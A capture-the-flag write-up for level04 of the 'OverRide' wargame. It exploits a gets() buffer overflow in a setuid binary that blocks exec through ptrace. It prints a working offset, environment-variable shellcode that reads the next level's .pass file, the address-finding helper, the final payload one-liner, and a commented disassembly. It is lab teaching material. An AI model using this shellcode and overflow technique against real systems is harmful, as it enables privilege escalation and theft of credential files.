# LEVEL04
**Info: level protect option**
```sh
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level04/level04
```
---
```sh
level04@OverRide:~$ ls -la
total 17
dr-xr-x---+ 1 level04 level04   80 Sep 13  2016 .
dr-x--x--x  1 root    root     260 Oct  2  2016 ..
-rw-r--r--  1 level04 level04  220 Sep 10  2016 .bash_logout
lrwxrwxrwx  1 root    root       7 Sep 13  2016 .bash_profile -> .bashrc
-rw-r--r--  1 level04 level04 3533 Sep 10  2016 .bashrc
-rwsr-s---+ 1 level05 users   7797 Sep 10  2016 level04
-rw-r--r--+ 1 level04 level04   41 Oct 19  2016 .pass
-rw-r--r--  1 level04 level04  675 Sep 10  2016 .profile
level04@OverRide:~$ ./level04 
Give me some shellcode, k
42
child is exiting...
level04@OverRide:~$ ./level04 
Give me some shellcode, k
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80
child is exiting...
```
We can find one excutable file **level04**, who take standard input, he wants some shellcode, but do not anything. \
\
Check it with GDB,

```sh
Breakpoint 1, 0x0804875e in main ()
(gdb) p/x $eax
$2 = 0xffffd670
```

After analyzing asm code, we could find buffer overflow-able function ```gets```, but there is also a protection for the ```exec``` system call (syscall number 11). \
So we have to somehow 1. get the flag without running the ```exec``` 2. and run the exploit code. \
First let's find the offset of buffer overflow
```sh
python3 pattern_generator.py
=== Buffer Overflow Pattern Generator & Offset Finder ===
Enter the length of the pattern to generate: 200
Generated pattern (200 bytes):
aa0aa1aa2aa3aa4aa5aa6aa7aa8aa9ab0ab1ab2ab3ab4ab5ab6ab7ab8ab9ac0ac1ac2ac3ac4ac5ac6ac7ac8ac9ad0ad1ad2ad3ad4ad5ad6ad7ad8ad9ae0ae1ae2ae3ae4ae5ae6ae7ae8ae9af0af1af2af3af4af5af6af7af8af9ag0ag1ag2ag3ag4ag5ag

Enter the hex value to find (e.g., 0x63613563): 0x61326661
Little Endian ASCII representation: 'af2a'
'af2a' found at offset: 156
```
We could've put our shell code's address at 156 offset, but since it has ```exec``` syscall inside, we are going to use another shell code which will directly give us the flag for the next level
```sh
export SHELLCODE=$'\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x86\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level05/.pass'
```
This machine code will try to open the file specified at the end of code and directly write it out on the ```stdout```. \
Also since we exported our shell code we have to find it's address. Let's perform it with writing simple c code ```getenv.c``` which will give us an address we need.
```sh
level04@OverRide:~$ cat /tmp/getenv.c
#include <stdio.h>
#include <stdlib.h>

int main()
{
    printf("%p\n", getenv("SHELLCODE"));
}
level04@OverRide:/tmp$ gcc -m32 /tmp/getenv.c
level04@OverRide:/tmp$ ./a.out 
0xffffd8b0
```
Note that we are running on x86_64, so we have to compile our program for 32bit to get the address in 32bit format. \
Now let's try to run our program with our exploit input.
```sh
level04@OverRide:~$ python -c 'print "B" * 156 + "\xb0\xd8\xff\xff"' | ./level04 
Give me some shellcode, k
(hidden)
child is exiting...
```
level04 passed !

assmebly analayse
---
```sh
(gdb) disas main
Dump of assembler code for function main:
   0x080486c8 <+0>:     push   %ebp
   0x080486c9 <+1>:     mov    %esp,%ebp
   0x080486cb <+3>:     push   %edi
   0x080486cc <+4>:     push   %ebx
   0x080486cd <+5>:     and    $0xfffffff0,%esp
   0x080486d0 <+8>:     sub    $0xb0,%esp # 176
   0x080486d6 <+14>:    call   0x8048550 <fork@plt>
   0x080486db <+19>:    mov    %eax,0xac(%esp) # var pid = fork()
   0x080486e2 <+26>:    lea    0x20(%esp),%ebx # str[128] # 172 - 32 = 140 - 12 = 128
   0x080486e6 <+30>:    mov    $0x0,%eax # 0
   0x080486eb <+35>:    mov    $0x20,%edx # 32
   0x080486f0 <+40>:    mov    %ebx,%edi
   0x080486f2 <+42>:    mov    %edx,%ecx
   0x080486f4 <+44>:    rep stos %eax,%es:(%edi) # memset(str[128], 128, 0)
   0x080486f6 <+46>:    movl   $0x0,0xa8(%esp) # some variable init with 0 int a = 0
   0x08048701 <+57>:    movl   $0x0,0x1c(%esp) # some variable init with 0 int b = 0
   0x08048709 <+65>:    cmpl   $0x0,0xac(%esp) # if pid == 0
   0x08048711 <+73>:    jne    0x8048769 <main+161>
   0x08048713 <+75>:    movl   $0x1,0x4(%esp) # parent process
   0x0804871b <+83>:    movl   $0x1,(%esp)
   0x08048722 <+90>:    call   0x8048540 <prctl@plt> # prctl(PR_SET_PDEATHSIG, SIGHUP)  # https://github.com/torvalds/linux/blob/master/include/uapi/linux/prctl.h
   0x08048727 <+95>:    movl   $0x0,0xc(%esp)
   0x0804872f <+103>:   movl   $0x0,0x8(%esp)
   0x08048737 <+111>:   movl   $0x0,0x4(%esp)
   0x0804873f <+119>:   movl   $0x0,(%esp)
   0x08048746 <+126>:   call   0x8048570 <ptrace@plt> # ptrace(PTRACE_TRACEME, 0, 0, 0) # https://github.com/torvalds/linux/blob/master/include/uapi/linux/ptrace.h
   0x0804874b <+131>:   movl   $0x8048903,(%esp) # "Give me some shellcode, k"
   0x08048752 <+138>:   call   0x8048500 <puts@plt>
   0x08048757 <+143>:   lea    0x20(%esp),%eax # str[128]
   0x0804875b <+147>:   mov    %eax,(%esp)
   0x0804875e <+150>:   call   0x80484b0 <gets@plt> # @ vulnerability @
   0x08048763 <+155>:   jmp    0x804881a <main+338>
   0x08048768 <+160>:   nop						# loop +296
   0x08048769 <+161>:   lea    0x1c(%esp),%eax # child process
   0x0804876d <+165>:   mov    %eax,(%esp) # var
   0x08048770 <+168>:   call   0x80484f0 <wait@plt> # wait(b)
   0x08048775 <+173>:   mov    0x1c(%esp),%eax
   0x08048779 <+177>:   mov    %eax,0xa0(%esp) # var
   0x08048780 <+184>:   mov    0xa0(%esp),%eax
   0x08048787 <+191>:   and    $0x7f,%eax # 0111_1111
   0x0804878a <+194>:   test   %eax,%eax # if 0
   0x0804878c <+196>:   je     0x80487ac <main+228>
   0x0804878e <+198>:   mov    0x1c(%esp),%eax
   0x08048792 <+202>:   mov    %eax,0xa4(%esp)
   0x08048799 <+209>:   mov    0xa4(%esp),%eax
   0x080487a0 <+216>:   and    $0x7f,%eax
   0x080487a3 <+219>:   add    $0x1,%eax
   0x080487a6 <+222>:   sar    %al # or its synonym shl # https://docs.oracle.com/cd/E19455-01/806-3773/instructionset-27/index.html
   0x080487a8 <+224>:   test   %al,%al
   0x080487aa <+226>:   jle    0x80487ba <main+242> # if (((b & 0x7f) != 0 && (((b & 0x7f) + 1) >> 1) <= 0))
   0x080487ac <+228>:   movl   $0x804891d,(%esp) # "child is exiting..."
   0x080487b3 <+235>:   call   0x8048500 <puts@plt>
   0x080487b8 <+240>:   jmp    0x804881a <main+338> # return (0)
   0x080487ba <+242>:   movl   $0x0,0xc(%esp) # 0
   0x080487c2 <+250>:   movl   $0x2c,0x8(%esp) # 44
   0x080487ca <+258>:   mov    0xac(%esp),%eax # var pid
   0x080487d1 <+265>:   mov    %eax,0x4(%esp)
   0x080487d5 <+269>:   movl   $0x3,(%esp)
   0x080487dc <+276>:   call   0x8048570 <ptrace@plt> # ptrace(3, pid, 44, 0)
   0x080487e1 <+281>:   mov    %eax,0xa8(%esp) # return of ptrace
   0x080487e8 <+288>:   cmpl   $0xb,0xa8(%esp) # if (ptrace(PTRACE_PEEKUSER, pid, 44, 0) == 11)
   0x080487f0 <+296>:   jne    0x8048768 <main+160>
   0x080487f6 <+302>:   movl   $0x8048931,(%esp) # "no exec() for you"
   0x080487fd <+309>:   call   0x8048500 <puts@plt>
   0x08048802 <+314>:   movl   $0x9,0x4(%esp) # 9
   0x0804880a <+322>:   mov    0xac(%esp),%eax # var pid
   0x08048811 <+329>:   mov    %eax,(%esp)
   0x08048814 <+332>:   call   0x8048520 <kill@plt> # kill(pid, 9) # SIG_KILL
   0x08048819 <+337>:   nop
   0x0804881a <+338>:   mov    $0x0,%eax
   0x0804881f <+343>:   lea    -0x8(%ebp),%esp
   0x08048822 <+346>:   pop    %ebx
   0x08048823 <+347>:   pop    %edi
   0x08048824 <+348>:   pop    %ebp
   0x08048825 <+349>:   ret    
End of assembler dump.
```